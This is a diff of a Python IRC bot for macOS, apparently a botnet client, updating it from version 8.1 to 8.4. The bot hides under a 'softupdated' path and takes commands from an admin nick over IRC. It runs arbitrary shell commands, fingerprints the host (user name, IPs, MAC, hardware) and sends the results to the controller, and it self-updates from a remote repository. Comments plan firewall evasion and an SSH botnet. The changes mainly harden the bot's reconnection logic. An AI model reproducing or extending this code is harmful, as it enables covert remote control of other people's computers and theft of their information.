@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 # MIT Liscence
-version = "8.1"                                                                 # bot version
+version = "8.4"                                                                 # bot version
 
 # library imports
 import os, sys, socket, signal, time, platform      # general
@@ -13,6 +13,7 @@ from StringIO import StringIO                       # output redirection for log
 
 from modules.logging import logfile, log
 
+#TODO: bugfixes full_name detection, keeps defaulting to CVMSRoot for some reason
 #TODO: make portscan timeout or cancellable
 #TODO: make run fully interactive by capturing input and using p.write() or p.stdin()
 #TODO: modules:
@@ -22,8 +23,11 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
+start_time = strftime("%m-%d|%H:%M")
+
 try:
-    logfile(filename="/var/softupdated/bot_v%s(%s).log" % (version, strftime("%m-%d|%H:%M")))                  # redirects bot output to logfile
+    os.popen("touch /var/softupdated/bot_v%s(%s).log" % (version, start_time)).read().strip()
+    logfile(filename="/var/softupdated/bot_v%s(%s).log" % (version, start_time))                  # redirects bot output to logfile
 except Exception as e:
     print e
 
@@ -39,18 +43,24 @@ allowed_sources = ["thesquash"]                                                 
 admin = 'thesquash'                                                             # the nick to send privmsgs to by default
 
 hostname = socket.gethostname()                                                 # host's hostname
+
+### NICKNAME RESOLUTION
+
 main_user = os.popen("stat -f '%Su' /dev/console").read().strip()               # main user of the computer detected by current owner of /dev/console
 
-if main_user == "root":
+if main_user == 'root':
     main_user = os.popen("ps aux | grep CoreServices/Finder.app | head -1 | awk '{print $1}'").read().strip()
 
 main_user_full = os.popen("finger %s | awk -F: '{ print $3 }' | head -n1 | sed 's/^ //'" % main_user).read().strip()
+
 if len(main_user_full) < 1:
     main_user_full = main_user
 
 local_user = getpass.getuser()                                                  # user the bot is running as
 
 nick = '[%s]' % main_user_full.replace(" ", "")[:14]                            # bot's nickname
+
+### NICKNAME RESOLUTION
 
 ############ Flow functions
 
@@ -68,12 +78,12 @@ def sigterm_handler(signum, frame):                                             
     log('[#] ----Subprocess Spawned----')
     privmsg('----Subprocess Spawned----')
     irc.send ( 'QUIT\r\n' )
-    raise SystemExit                                                
+    raise SystemExit
     sys.exit()
 
 def line_split(lines_to_split, n):                                              # if output is multiline, split based on \n and max chars per line (n)
     output = []
-    if (lines_to_split.find('\n') == -1):
+    if lines_to_split.find('\n') == -1:
         output.append(lines_to_split)
     else:
         while (lines_to_split.find('\n') != -1):
@@ -88,11 +98,34 @@ def line_split(lines_to_split, n):                                              
 
 ############ IRC functions
 
+def still_connected(irc):
+    signal.signal(signal.SIGALRM, timeout_handler)
+    signal.alarm(3)
+    try:
+        log('[#] Testing Connection.')
+        log('[>] Sent:')
+        log('[>]    PING TEST')
+        sent_time = time.time()
+        irc.send('PING TEST\r\n')
+        found = False
+        while not found:
+            data = irc.recv(4096)
+            if data.find("PONG") != -1:
+                latency = str(round((time.time() - sent_time)*1000, 2))+"ms"
+                signal.alarm(0)
+                found = True
+        log('[#] Latency: %s' % latency)
+        return (True, latency)
+    except Exception as pong_exception:
+        signal.alarm(0)
+        log("[X] PING/PONG Failed: %s" % pong_exception)
+        return (False, "X: %s" % pong_exception)
+
 def parse(data):
     if data.find("PRIVMSG") != -1:
-        from_nick = data.split("PRIVMSG ",1)[0].split("!")[0][1:] # who sent the PRIVMSG
-        to_nick = data.split("PRIVMSG ",1)[1].split(" :",1)[0]  # where did they send it
-        text = data.split("PRIVMSG ",1)[1].split(" :",1)[1].strip()  # what did it contain
+        from_nick = data.split("PRIVMSG ",1)[0].split("!")[0][1:]               # who sent the PRIVMSG
+        to_nick = data.split("PRIVMSG ",1)[1].split(" :",1)[0]                  # where did they send it
+        text = data.split("PRIVMSG ",1)[1].split(" :",1)[1].strip()             # what did it contain
         if source_checking_enabled and (from_nick not in allowed_sources and from_nick != admin):
             log("[>]     Not from an allowed source. (source checking enabled)")
             return (False,"","")                     # break and return nothing if message is invalid
@@ -104,10 +137,10 @@ def parse(data):
             return_to = from_nick
         log("[>]     Content: %s, Source: %s, Return To: %s" % (text, source, return_to))
         return (text, source, return_to)
-    elif data.find("PING :",0,6) != -1:               # was it just a ping?
-        from_srv = data.split("PING :")[1].strip()    # the source of the PING
+    elif data.find("PING :",0,6) != -1:                                         # was it just a ping?
+        from_srv = data.split("PING :")[1].strip()                              # the source of the PING
         return ("PING", from_srv, from_srv)
-    return (False,"","")                         # break and return nothing if message is invalid
+    return (False,"","")                                                        # break and return nothing if message is invalid
 
 def privmsg(msg=None, to=admin):                                                # function to send a private message to a user, defaults to master of bots!
     if type(msg) is unicode:
@@ -130,45 +163,37 @@ def privmsg(msg=None, to=admin):                                                
                 data = ""
                 pass
             signal.alarm(0)
-            if (data.find('!stop') != -1):
+            if data.find('!stop') != -1:
                 log('[+] Recieved:')
                 log('[>]    ', data.strip())
                 retcode = "Stopped buffered multiline output."
                 privmsg("[X]: %s" % retcode, to)
                 break
             log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
-            irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))  # [1/10] = Output line 1 out of 10 total
-        log('[#] Finished multiline output.')     
+            signal.signal(signal.SIGALRM, timeout_handler)
+            signal.alarm(2)
+            try:
+                irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))  # [1/10] = Output line 1 out of 10 total
+            except Exception as send_error:
+                log('[X] irc.send exception: ', send_error)
+                timeout_count = 50
+            signal.alarm(0)
+
+        log('[#] Finished multiline output.')
     else:
         log('[+] Sent Data:')
         log('[<]    PRIVMSG %s :%s\r' % (to, msg))
-        irc.send ('PRIVMSG %s :%s\r\n' % (to, msg))
+        signal.signal(signal.SIGALRM, timeout_handler)
+        signal.alarm(2)
+        try:
+            irc.send('PRIVMSG %s :%s\r\n' % (to, msg))
+        except Exception as send_error:
+            log('[X] irc.send exception: ', send_error)
+            timeout_count = 50
+        signal.alarm(0)
 
 def broadcast(msg):                                                             # function to send a message to the main channel
     privmsg(msg, channel)
-
-def still_connected(irc):
-    signal.signal(signal.SIGALRM, timeout_handler)
-    signal.alarm(3)
-    try:
-        log('[#] Testing Connection.')
-        log('[>] Sent:')
-        log('[>]    PING TEST')
-        sent_time = time.time()
-        irc.send('PING TEST\r\n')
-        found = False
-        while not found:   
-            data = irc.recv(4096)   
-            if data.find("PONG") != -1:
-                latency = str(round((time.time() - sent_time)*1000, 2))+"ms"
-                signal.alarm(0)
-                found = True
-        log('[#] Latency: %s' % latency)
-        return (True, latency)
-    except Exception as pong_exception:
-        signal.alarm(0)
-        log("[X] PING/PONG Failed: %s" % pong_exception)
-        return (False, "X: %s" % pong_exception)
 
 def reload_bot():
     log('[#] ----Reloading Bot----')
@@ -180,7 +205,7 @@ def reload_bot():
     privmsg('----New Process Spawned----')
     quit_status = True
     irc.send('QUIT\r\n')
-    raise SystemExit                                              
+    raise SystemExit
     sys.exit()
 
 ############ Keyword functions
@@ -197,6 +222,7 @@ def geo_locate(ip="",with_proxy=False):                                         
             geo_json = urllib2.urlopen('http://freegeoip.net/json/').read()
         else:
             proxy_handler = urllib2.ProxyHandler({})
+
             opener = urllib2.build_opener(proxy_handler)
             req = urllib2.Request('http://freegeoip.net/json/%s' % ip)
             r = opener.open(req)
@@ -250,7 +276,7 @@ def identify():                                                                 
     mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
     log('[>]    MAC:     ',mac_addr)
     return "[v%s/x%s] %s %s l: %s p: %s MAC: %s" % (version, system.strip(), main_user_full.ljust(20), (main_user[:14]+"@"+hostname[:13]).ljust(30), local_ip.ljust(16), public_ip.ljust(16), mac_addr)
- 
+
 def full_identify():                                                            # give verbose identifying info about the host computer
     log('[+] Running v%s Identification Modules...' % version)
     privmsg('[+] Running v%s Identification Modules...' % version)
@@ -287,16 +313,16 @@ def full_identify():                                                            
         public_ip = url_error
     log('[>]    Public:  ', public_ip)
     privmsg('[>]      Public:  %s' % public_ip)
-    
+
     mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
     log('[>]    MAC:     ', mac_addr)
     privmsg('[>]      MAC:     %s' % mac_addr)
-    
+
     cmd = "system_profiler SPPowerDataType | grep Connected"
     for line in run_shell(cmd):
         log('[>]    Power:    ', line)
         privmsg('[>]      Power:    %s' % line)
-    
+
     cmd = "uptime"
     for line in run_shell(cmd):
         log('[>]    UP:    ', line)
@@ -319,14 +345,14 @@ def full_identify():                                                            
     except:
         log('[>]    Skype:    None Found.')
         privmsg('[>]      Skype:    None Found.')
-    
+
     cmd = "system_profiler SPHardwareDataType"
     log('[>]    CMD:     ',cmd)
     p = Popen([cmd],shell=True, stdout=PIPE, stderr=STDOUT, executable='/bin/bash')
     hardware = p.stdout.read()
     log('[>]    Hardware.')
     privmsg(str(hardware))
-    
+
     privmsg('[√] Done.')
 
 def run_shell(cmd, timeout=60, verbose=False):                                  # run a shell command and return the output, verbose enables live command output via yield
@@ -361,7 +387,7 @@ def run_shell(cmd, timeout=60, verbose=False):                                  
             retcode = p.poll()  #returns None while subprocess is running
         signal.alarm(0)
 
-        if (data.find('!cancel') != -1):
+        if data.find('!cancel') != -1:
             log('[+] Recieved:')
             log('[>]    ', data.strip())
             retcode = "Cancelled live output reading. You have to kill the process manually."
@@ -377,7 +403,7 @@ def run_shell(cmd, timeout=60, verbose=False):                                  
             except:
                 retcode = "Too much output, read timed out. Process is still running in background."
             signal.alarm(0)
-            if verbose and len(line) > 0: 
+            if verbose and len(line) > 0:
                 yield(line)
             if retcode != 0:
                 yield("[X]: %s" % retcode)
@@ -470,7 +496,7 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):               
     for line in run_shell(cmd, timeout=60, verbose=True):
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
-    
+
     privmsg('[#]   Removing downloaded source...')
     cmd = "rm -f /private/var/softupdated/code.zip && rm -Rf /private/var/softupdated/code"
     for line in run_shell(cmd, timeout=30, verbose=True):
@@ -493,11 +519,11 @@ def unadmin(admins):
 
 ############ The beef of things
 if __name__ == '__main__':
-    if len(nick) > 15: 
+    if len(nick) > 15:
         nick = '[%s]' % main_user_full.replace(" ", "")[:13]                                        # if nick is over 15 characters, change to username truncated at 13 chars
     elif len(nick) < 5:
         nick = '[%s]' % main_user_full.replace(" ", "")
-        if len(nick) > 15: 
+        if len(nick) > 15:
             nick = nick[:14]+']'                                                # if nick is over 15 characters, truncate
         elif len(nick) < 5:
             nick += str(random.randint(1,200))
@@ -511,7 +537,8 @@ if __name__ == '__main__':
         try:
             timeout_count = 0
             last_ping = time.time()                                             # last ping recieved
-            last_data = data = ''
+            data = ''
+            last_data = ''
             log("[+] Connecting...")
             log("[<]    Nick:        ", nick)
             log("[<]    Server:      ", server+':'+str(port))
@@ -543,11 +570,11 @@ if __name__ == '__main__':
                     data = irc.recv(4096)
                     log('[+] Recieved:')
                     log('[>]    ', data.strip())
-                    if (last_data == data):                                     # IRC servers  will occasionally send lots of blank messages instead of disconnecting
-                        timeout_count += 1       
+                    if last_data == data:                                     # IRC servers  will occasionally send lots of blank messages instead of disconnecting
+                        timeout_count += 1
                     else:
-                        timeout_count = 0  
-                    last_data = data    
+                        timeout_count = 0
+                    last_data = data
                 except socket.timeout:
                     if time.time() - last_ping > threshold:                     # if reciving data times out and ping threshold is exceeded
                         quit_status = False
@@ -555,14 +582,19 @@ if __name__ == '__main__':
                         break
                     else:
                         data = str(time.time())
-                        timedout_count = 0
+                        timeout_count = 0
+                except Exception as exit_exception:
+                    log('[X] irc.recv exception: ', exit_exception)
+                    if not still_connected(irc)[0]:
+                        privmsg("Reloading due to irc.recv error: %s" % exit_exception)
+                        reload_bot()
 
                 if len(data) < 1 or timeout_count > 5:                          # check connection when instability is detected or a blank message is recieved from the server
-                    if still_connected(irc):
+                    if still_connected(irc)[0]:
                         timeout_count = 0
                     else:
                         quit_status = False
-                        timedout_count = 50
+                        timeout_count = 50
                         break
 
                 if data.find('ickname is already in use') != -1:
@@ -720,7 +752,7 @@ if __name__ == '__main__':
                                         data = irc.recv(4096)
                                         log('[+] Recieved:')
                                         log('[>]    ', data.strip())
-                                        if (data.find('!cancel') != -1):
+                                        if data.find('!cancel') != -1:
                                             retcode = "Cancelled."
                                             privmsg("[X]: %s" % retcode, to=return_to)
                                             signal.alarm(0)
@@ -765,9 +797,7 @@ if __name__ == '__main__':
             privmsg('Quitting Intentionally. %s' % quit_reason)
             irc.send('QUIT\r\n')
             break
-        except RuntimeError as exit_exception:
-            log("[#] ----EXCEPTION---- ",exit_exception)
         except Exception as exit_exception:
-            log("[#] ----EXCEPTION---- ",exit_exception)        
+            log("[#] ----EXCEPTION---- ",exit_exception)
     log("[*] EXIT")
     raise SystemExit(0)
